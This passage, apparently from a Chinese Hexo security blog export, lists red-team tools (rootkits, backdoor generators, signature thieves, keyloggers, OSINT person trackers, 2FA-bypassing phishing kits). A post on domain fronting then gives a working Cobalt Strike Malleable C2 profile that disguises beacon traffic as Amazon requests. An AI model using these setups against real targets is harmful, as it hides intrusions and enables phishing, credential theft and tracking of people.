href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a> 宏混淆，其中还包括AV/Sandboxes逃避机制<br><br><a href="https://github.com/Kkevsterrr/backdoorme">https://github.com/Kkevsterrr/backdoorme</a> py3、py2多种类型的后门、shell生成工具，可以自动维持权限<br><br><a href="https://github.com/TestingPens/MalwarePersistenceScripts">https://github.com/TestingPens/MalwarePersistenceScripts</a> win下权限维持脚本<br><br><a href="https://github.com/mhaskar/Linux-Root-Kit">https://github.com/mhaskar/Linux-Root-Kit</a> py，simple，linux下rootkit<br><br><a href="https://github.com/PinkP4nther/Sutekh">https://github.com/PinkP4nther/Sutekh</a> simple，rootkit，使普通用户获取root shell<br><br><a href="https://github.com/threatexpress/metatwin">https://github.com/threatexpress/metatwin</a> 从一个文件中提取元数据，包括数字签名，并注入到另一个文件中<br><br><a href="https://github.com/Mr-Un1k0d3r/Windows-SignedBinary">https://github.com/Mr-Un1k0d3r/Windows-SignedBinary</a> 可以修改二进制文件的HASH，同时保留微软windows的签名<br><br><a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a> py，用于劫持合法的数字签名并绕过Windows的哈希验证机制的脚本工具<br><br><a href="https://github.com/9aylas/Shortcut-Payload-Generator">https://github.com/9aylas/Shortcut-Payload-Generator</a> 快捷方式(.lnk)文件Payload生成器.AutoIt编写<br><br><a href="https://github.com/GuestGuri/Rootkit">https://github.com/GuestGuri/Rootkit</a> 反弹一个tcp连接，将进程id绑定到一个空文件夹<br><br><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a> 可以生成win32PE后门测试程序,ELF文件后门程序等</p></blockquote><h2 id="社会工程"><a href="#社会工程" class="headerlink" title="社会工程"></a><strong>社会工程</strong></h2><blockquote><p><a href="https://github.com/brannondorsey/PassGAN">https://github.com/brannondorsey/PassGAN</a> py,深度学习,密码字典样本生成<br><br><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a> 根据用户习惯密码生成弱口令探测<br><br><a href="https://github.com/Saferman/cupper">https://github.com/Saferman/cupper</a> 根据用户习惯密码生成弱口令探测，楼上升级<br><br><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a> py3，特定密码字典生成<br><br><a href="https://github.com/mehulj94/Radium-Keylogger">https://github.com/mehulj94/Radium-Keylogger</a> python下的键盘记录工具<br><br><a href="https://github.com/threatexpress/domainhunter">https://github.com/threatexpress/domainhunter</a> 检查过期域名，bluecoat分类和Archive.org历史记录，以确定最为适合于钓鱼和C2的域名<br><br><a href="https://github.com/Mr-Un1k0d3r/CatMyPhish">https://github.com/Mr-Un1k0d3r/CatMyPhish</a> 收集目标类似的尚未注册的域名<br><br><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a> Bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息<br><br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a> Sreg可对使用者通过输入email、phone、username的返回用户注册的所有互联网护照信息。<br><br><a href="https://github.com/SpiderLabs/social_mapper">https://github.com/SpiderLabs/social_mapper</a> 社交媒体枚举和关联工具, 通过人脸识别关联人物侧写<br><br><a href="https://github.com/vysec/MaiInt">https://github.com/vysec/MaiInt</a> 公司雇员信息收集测试工具<br><br><a href="https://github.com/jofpin/trape">https://github.com/jofpin/trape</a> py，利用OSINT对人员进行追踪定位<br><br><a href="https://github.com/famavott/osint-scraper">https://github.com/famavott/osint-scraper</a> 输入人名或邮箱地址, 自动从互联网爬取关于此人的信息<br><br><a href="https://github.com/xHak9x/fbi">https://github.com/xHak9x/fbi</a> py2,facebook脸书信息搜集工具<br><br><a href="https://github.com/initstring/linkedin2username">https://github.com/initstring/linkedin2username</a> 通过Linkedin 领英获取相关公司员工列表<br><br><a href="https://github.com/0x09AL/raven">https://github.com/0x09AL/raven</a> linux下领英Linkedin information gathering tool<br><br><a href="https://github.com/Ridter/Mailget">https://github.com/Ridter/Mailget</a> 通过脉脉用户猜测企业邮箱<br><br><a href="https://github.com/haccer/tweep">https://github.com/haccer/tweep</a> 使用twitter API进行信息爬取查询<br><br><a href="https://github.com/MazenElzanaty/TwLocation">https://github.com/MazenElzanaty/TwLocation</a> py，获取Twitter用户发推的地址<br><br><a href="https://github.com/vaguileradiaz/tinfoleak">https://github.com/vaguileradiaz/tinfoleak</a> web界面，对某人的twitter进行全面的情报分析<br><br><a href="https://github.com/deepfakes">https://github.com/deepfakes</a> 虚假音视频制作<br><br><a href="https://www.jianshu.com/p/147cf5414851">https://www.jianshu.com/p/147cf5414851</a> 聊聊那些常见的探侦类APP<br><br><a href="https://github.com/thinkst/canarytokens">https://github.com/thinkst/canarytokens</a> 重要文件的追踪溯源，信标定位（<br><a href="https://canarytokens.org/generate#%EF%BC%89">https://canarytokens.org/generate#）</a><br><br><a href="https://github.com/ggerganov/kbd-audio">https://github.com/ggerganov/kbd-audio</a> c++,linux,利用麦克风监控键盘输入测试输入值</p></blockquote><h2 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a><strong>钓鱼邮件</strong></h2><blockquote><p><a href="https://github.com/bhdresh/SocialEngineeringPayloads">https://github.com/bhdresh/SocialEngineeringPayloads</a> 负责收集用于证书盗窃和鱼叉式网络钓鱼攻击的社交工程技巧和payloads<br><br><a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a> 专为社交工程设计的开源渗透测试框架<br><br><a href="https://github.com/thelinuxchoice/blackeye">https://github.com/thelinuxchoice/blackeye</a> 拥有facebook、instagram等三十余个钓鱼模板的一键启用工具<br><br><a href="https://github.com/M4cs/BlackEye-Python">https://github.com/M4cs/BlackEye-Python</a> 以blackeye为基础加强子域的管理<br><br><a href="https://github.com/azizaltuntas/Camelishing">https://github.com/azizaltuntas/Camelishing</a> py3，界面化社会工程学攻击辅助工具<br><br><a href="https://github.com/JonCooperWorks/judas">https://github.com/JonCooperWorks/judas</a> go，克隆网站钓鱼<br><br><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a> go，拥有在线模板设计、发送诱骗广告等功能的钓鱼系统<br><br><a href="https://github.com/tatanus/SPF">https://github.com/tatanus/SPF</a> py2，deefcon上的钓鱼系统<br><br><a href="https://github.com/MSG-maniac/mail_fishing">https://github.com/MSG-maniac/mail_fishing</a> 甲方内部钓鱼系统<br><br><a href="https://github.com/samyoyo/weeman">https://github.com/samyoyo/weeman</a> 钓鱼的<br>http服务器<br><br><a href="https://github.com/Raikia/FiercePhish">https://github.com/Raikia/FiercePhish</a> 可以管理所有钓鱼攻击的完整钓鱼框架，允许你跟踪单独的网络钓鱼活动，定时发送电子邮件等<br><br><a href="https://github.com/securestate/king-phisher">https://github.com/securestate/king-phisher</a> 可视化钓鱼活动工具包<br><br><a href="https://github.com/fireeye/ReelPhish">https://github.com/fireeye/ReelPhish</a> 实时双因素网络钓鱼工具<br><br><a href="https://github.com/kgretzky/evilginx">https://github.com/kgretzky/evilginx</a> 绕过双因素验证的钓鱼框架<br><br><a href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a> MiTM 框架, 登录页面钓鱼, 绕过双因素认证等<br><br><a href="https://github.com/ustayready/CredSniper">https://github.com/ustayready/CredSniper</a> 使用Flask和Jinja2模板编写的网络钓鱼框架，支持捕获2FA令牌<br><br><a href="https://github.com/fireeye/PwnAuth">https://github.com/fireeye/PwnAuth</a> OAuth滥用测试检测平台<br><br><a href="https://github.com/n0pe-sled/Postfix-Server-Setup">https://github.com/n0pe-sled/Postfix-Server-Setup</a> 自动化建立一个网络钓鱼服务器<br><br><a href="https://github.com/Dionach/PhEmail">https://github.com/Dionach/PhEmail</a> py2，钓鱼与邮件伪造<br><br><a href="https://github.com/PHPMailer/PHPMailer">https://github.com/PHPMailer/PHPMailer</a> 世界上最流行的PHP发送邮件的代码<br><br><a href="http://tool.chacuo.net/mailanonymous">http://tool.chacuo.net/mailanonymous</a> 在线邮件伪造<br><br><a href="http://ns4gov.000webhostapp.com/">http://ns4gov.000webhostapp.com</a> 在线邮件伪造</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C2隐匿之域前置</title>
      <link href="2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/"/>
      <url>2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h1><h2 id="step1-apache-or-ngnix"><a href="#step1-apache-or-ngnix" class="headerlink" title="step1: apache or ngnix "></a>step1: apache or ngnix </h2><hr><p><strong>1:首先需要一台前置服务器，以便流量中转。然后注册一个域名，如：attack.com</strong></p><hr><p><strong>2:然后利用CDN解析域名到域前置服务器同时隐藏ip</strong></p><p>有时候修改HTTP包内的Host头字段，会将HTTP包发送给Host指向的那个域名。这就是因为这两个网站域名都是使用了同一家的CDN，而CDN就是通过判断Host头进行流量转发的。<br>很多CDN都存在这个特性。因此CDN可以匿藏你的域前置服务器的ip.</p><hr><h2 id="step2-域前置服务器的Rewrite设置"><a href="#step2-域前置服务器的Rewrite设置" class="headerlink" title="step2: 域前置服务器的Rewrite设置"></a><strong>step2: 域前置服务器的Rewrite设置</strong></h2><hr><p>域前置服务器收到cs马的stage，需要转发给teamserver，这时候需要利用rewrite进行流量的转发。</p><p>这里可以利用<a href="https://github.com/threatexpress/cs2modrewrite">脚本</a> 生成apache 的rewrite配置代码。</p><hr><h2 id="step3-C2-Server自定义流量"><a href="#step3-C2-Server自定义流量" class="headerlink" title="step3:C2 Server自定义流量"></a><strong>step3:C2 Server自定义流量</strong></h2><p>配置C2 profile以设置CS生成payload的http请求参数，我这里直接使用并修改了<a href="https://twitter.com/harmj0y">harmj0y</a> 在github上的项目<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a> 中的amazon.profile。</p><pre><code>set sleeptime &quot;5000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;http-get &#123;    set uri &quot;/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        metadata &#123;            base64;            prepend &quot;session-token=&quot;;            prepend &quot;skin=noskin;&quot;;            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;            header &quot;Cookie&quot;;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        output &#123;            print;        &#125;    &#125;&#125;http-post &#123;    set uri &quot;/N4215/adj/amzn.us.sr.aps&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Content-Type&quot; &quot;text/xml&quot;;        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        parameter &quot;sz&quot; &quot;160x600&quot;;        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;        id &#123;            parameter &quot;sn&quot;;        &#125;        parameter &quot;s&quot; &quot;3717&quot;;        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.attack.com&quot;;        output &#123;            base64;            print;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;        output &#123;            print;        &#125;    &#125;&#125;</code></pre><p>这里将Host修改成我们申请到的域名就行了(<a href="http://www.attack.com),启动teamserver加载profile./">www.attack.com)，启动teamserver加载profile。</a></p><p><em>./teamserver 1.1.1.1 xxxx ./c2.profile</em></p><hr><h2 id="step4-C2-server-创建监听"><a href="#step4-C2-server-创建监听" class="headerlink" title="step4:C2-server 创建监听"></a><strong>step4:C2-server 创建监听</strong></h2><p>完成之后，当目标执行payload 对你的域名 attack.com 发起 <a href="http://www.attack.com/xxxx">http://www.attack.com/xxxx</a> 请求</p><p><img src="/images/DomainFronting/listener.jpg" alt="配置监听器"></p><hr><p>此处连接的显示的ip为CDN的解析IP地址。此时域前置将请求转发到真正的C2-server，然后得到响应payload的stager。</p><p><img src="/images/DomainFronting/shell.jpg" alt="payload执行"></p><hr><p>C2-server 上线成功</p><p><img src="/images/DomainFronting/success.jpg" alt="payload执行"></p><hr><blockquote><p>Tips:记录几个坑点</p><ol><li>测试Rewrite配置是否正确启动</li><li>CDN会拦截请求，导致文件执行失败，需要设置CDN防火墙</li></ol></blockquote><hr><p>*遗留问题</p><blockquote><p><strong>在此配置场景的会话下，无法获取进程迁移与权限提升的会话。</strong></p></blockquote><p>参考链接：<br><a href="https://xz.aliyun.com/t/7758">https://xz.aliyun.com/t/7758</a><br><a href="https://www.lz1y.cn/2019/03/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE-%E9%9A%90%E8%97%8F%E4%BD%A0%E7%9A%84C2-server/">https://www.lz1y.cn/2019/03/21/红队基础建设-隐藏你的C2-server/</a></p>]]></content>
      
      
      <categories>
          
          <category> attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码保护文件</title>
      <link href="2020/09/22/mi-ma-bao-hu-wen-jian/"/>
      <url>2020/09/22/mi-ma-bao-hu-wen-jian/</url>
      
        <content type="html"><![CDATA[<p>root<br>root</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FirstBlog</title>
      <link href="2020/09/22/firstblog/"/>
      <url>2020/09/22/firstblog/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
